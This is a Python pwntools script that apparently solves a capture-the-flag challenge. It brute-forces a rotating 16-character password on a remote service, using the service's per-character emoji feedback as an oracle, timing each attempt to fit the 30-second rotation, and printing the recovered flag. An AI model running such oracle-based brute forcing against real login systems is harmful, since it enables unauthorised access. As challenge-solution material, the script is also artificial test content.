import os
import re
import string
import time

from pwn import *

HOST = os.environ["SERVICE_APP_MAIN_HOST"]
PORT = int(os.environ["SERVICE_APP_MAIN_PORT"])

ALPHABET = string.ascii_lowercase
PASSWORD_LENGTH = 16
ROUND_DURATION = 30
# Leave a safety margin so a whole attack attempt (alphabet probe +
# per-character brute force) comfortably fits inside one 30s round.
MIN_REMAINING_SECONDS = 20
MAX_ATTEMPTS = 5

EXPIRES_RE = re.compile(rb"expires at (\d+):(\d+):(\d+) UTC")


def seconds_until_midnight_wrap(expires_h, expires_m, expires_s, now_struct):
    now_sec = now_struct.tm_hour * 3600 + now_struct.tm_min * 60 + now_struct.tm_sec
    expires_sec = expires_h * 3600 + expires_m * 60 + expires_s
    return (expires_sec - now_sec) % (24 * 3600)


def connect_fresh_round():
    """
    Connect and make sure we land near the start of a password round, so the
    whole brute force comfortably finishes before the password rotates again
    (every ROUND_DURATION seconds, shared across all connections).
    """
    while True:
        conn = remote(HOST, PORT)
        banner = conn.recvuntil(b"Password: ", timeout=10)
        match = EXPIRES_RE.search(banner)
        if not match:
            # Could not parse the expiry banner, just proceed and hope for the best.
            return conn

        remaining = seconds_until_midnight_wrap(
            int(match.group(1)), int(match.group(2)), int(match.group(3)), time.gmtime()
        )

        if remaining >= MIN_REMAINING_SECONDS:
            return conn

        info("Only %d seconds left in this round, waiting for refresh...", remaining)
        conn.close()
        time.sleep(remaining + 1)


RED = "\U0001F534"  # red circle: correct character, correct position


def ask(conn, candidate):
    """
    Send a guess and return the raw emoji feedback line (does not touch the
    following prompt - see characters_match()/probe() for that).
    """
    conn.sendline(candidate.encode())
    return conn.recvline().decode(errors="replace")


def characters_match(conn, candidate):
    """
    Send a guess and report whether its last character is in the right spot.
    When the candidate is a full-length exact match, the server short
    circuits straight to the flag line instead of reprompting - in that case
    we must NOT wait for another "Password: " prompt (there isn't one), so
    the caller is responsible for reading the flag itself.
    """
    response = ask(conn, candidate)
    matched_last = response[len(candidate) - 1] == RED
    full_match = matched_last and len(candidate) == PASSWORD_LENGTH
    if not full_match:
        conn.recvuntil(b"Password: ")
    return matched_last, full_match


def attempt():
    start = time.time()
    conn = connect_fresh_round()

    min_alphabet = ""
    for c in ALPHABET:
        response = ask(conn, c)
        conn.recvuntil(b"Password: ")
        if response[0] != "\u26AB":  # black circle == not present anywhere
            min_alphabet += c
            info("alphabet so far: %s", min_alphabet)
    success("min alphabet: %s", min_alphabet)

    secret = ""
    while len(secret) < PASSWORD_LENGTH:
        if time.time() - start > ROUND_DURATION - 3:
            warn("Running out of time in this round, restarting attempt")
            conn.close()
            return None

        for c in min_alphabet:
            candidate = secret + c
            matched, full_match = characters_match(conn, candidate)
            if matched:
                secret = candidate
                info("secret so far: %s", secret)
                if full_match:
                    # The server already short-circuited to the flag line
                    # instead of reprompting - read it directly.
                    flag_line = conn.recvline(timeout=10).decode(errors="replace")
                    conn.close()
                    return flag_line
                break
        else:
            warn("Could not find the next character, restarting attempt")
            conn.close()
            return None


def main():
    for i in range(MAX_ATTEMPTS):
        info("Attempt %d/%d", i + 1, MAX_ATTEMPTS)
        try:
            result = attempt()
        except (EOFError, OSError) as exc:
            warn("Attempt crashed (%s), retrying", exc)
            result = None
        if result:
            print(result)
            return
    warn("Failed to recover the password within the allotted attempts")
    raise SystemExit(1)


if __name__ == "__main__":
    main()
